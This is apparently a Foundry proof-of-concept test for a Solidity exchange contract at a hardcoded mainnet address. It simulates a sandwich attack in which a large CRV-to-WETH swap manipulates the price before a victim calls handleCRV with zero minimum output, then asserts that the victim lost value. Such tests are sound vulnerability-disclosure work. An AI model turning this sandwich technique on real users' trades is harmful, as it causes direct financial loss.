```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface ICRVExchange {
    function paths(bytes32) external view returns (address dex, address[] memory path);
    function path_indexes(uint256) external view returns (bytes32);
    function handleCRV(address target_token, uint256 amount, uint256 min_amount) external;
    function crv_token() external view returns (address);
    function path_from_addr(uint index) external view returns (address);
    function path_to_addr(uint index) external view returns (address);
}

interface IUniswapV2Router02 {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract UserContract {
    // For ERC20 refund path
    function refundTarget(uint256) external {}

    // For ETH refund path – called with no arguments and value
    function refundTarget() external payable {}

    receive() external payable {}

    // Call handleCRV with the given parameters.
    // The contract must have approved the exchange to pull CRV tokens.
    function callHandleCRV(address exchange, address target_token, uint256 amount, uint256 min_amount) external {
        ICRVExchange(exchange).handleCRV(target_token, amount, min_amount);
    }
}

contract ExploitTest is Test {
    address constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant CRV_EXCHANGE = 0x65ff67d6a61ae6bab8821c584f5f394d35e9b50e;

    ICRVExchange exchange = ICRVExchange(CRV_EXCHANGE);
    IERC20 crv = IERC20(CRV);

    // User (victim) that will call handleCRV with no slippage protection
    UserContract user;
    address userAddr;

    function setUp() public {
        vm.label(CRV, "CRV");
        vm.label(WETH, "WETH");
        vm.label(CRV_EXCHANGE, "CRVExchange");

        // Deploy a user contract that will be the caller of handleCRV
        user = new UserContract();
        userAddr = address(user);
        vm.label(userAddr, "UserContract");

        // Fund the user contract with CRV tokens
        deal(CRV, userAddr, 1000e18);

        // Allow the CRVExchange to pull CRV from the user contract
        vm.prank(userAddr);
        crv.approve(CRV_EXCHANGE, type(uint256).max);
    }

    function testNoSlippageControl() public {
        // --------------------------------------------------------------------
        // 1. Verify that the exchange has at least one path from CRV to WETH
        // --------------------------------------------------------------------
        bytes32 pathHash = exchange.path_indexes(0);
        (address dex, address[] memory path) = exchange.paths(pathHash);
        require(dex != address(0), "No path registered in the CRVExchange");
        require(path[0] == CRV && path[path.length - 1] == WETH,
            "First path does not start with CRV and end with WETH");

        // Log the expected output for a fair swap before any manipulation
        uint256 amountIn = 100e18; // 100 CRV
        uint256 expectedOut;
        {
            uint256[] memory amounts = IUniswapV2Router02(dex).getAmountsOut(amountIn, path);
            expectedOut = amounts[amounts.length - 1];
            emit log_named_decimal_uint("Fair expected ETH out (no sandwich)", expectedOut, 18);
        }

        // --------------------------------------------------------------------
        // 2. Simulate an attacker sandwich: first swap to manipulate the price
        // --------------------------------------------------------------------
        address attacker = address(0xDEAD);
        deal(CRV, attacker, 10_000e18);
        deal(WETH, attacker, 10_000e18);
        vm.startPrank(attacker);
        IERC20(CRV).approve(dex, type(uint256).max);
        IERC20(WETH).approve(dex, type(uint256).max);

        // Attack: sell a large amount of CRV for WETH to drive down CRV price
        address[] memory attackPath = new address[](2);
        attackPath[0] = CRV;
        attackPath[1] = WETH;
        IUniswapV2Router02(dex).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            9_000e18, 0, attackPath, attacker, block.timestamp + 1
        );
        vm.stopPrank();

        // --------------------------------------------------------------------
        // 3. User calls handleCRV with min_amount = 0 (NO SLIPPAGE PROTECTION)
        // --------------------------------------------------------------------
        uint256 userEthBefore = userAddr.balance;
        vm.prank(userAddr);
        user.callHandleCRV(CRV_EXCHANGE, WETH, amountIn, 0);
        uint256 userEthAfter = userAddr.balance;
        uint256 userReceived = userEthAfter - userEthBefore;

        emit log_named_decimal_uint("User actually received ETH (after sandwich)", userReceived, 18);

        // --------------------------------------------------------------------
        // 4. Assert the vulnerability: user received far less than the fair amount
        // --------------------------------------------------------------------
        // Because min_amount was 0, the swap succeeded despite a manipulated price.
        // The user suffers a significant loss.
        assertLt(userReceived, expectedOut / 2, "Slippage control would have protected user");
        emit log("Vulnerability confirmed: No slippage control allowed trade at unfavourable price");
    }
}
```
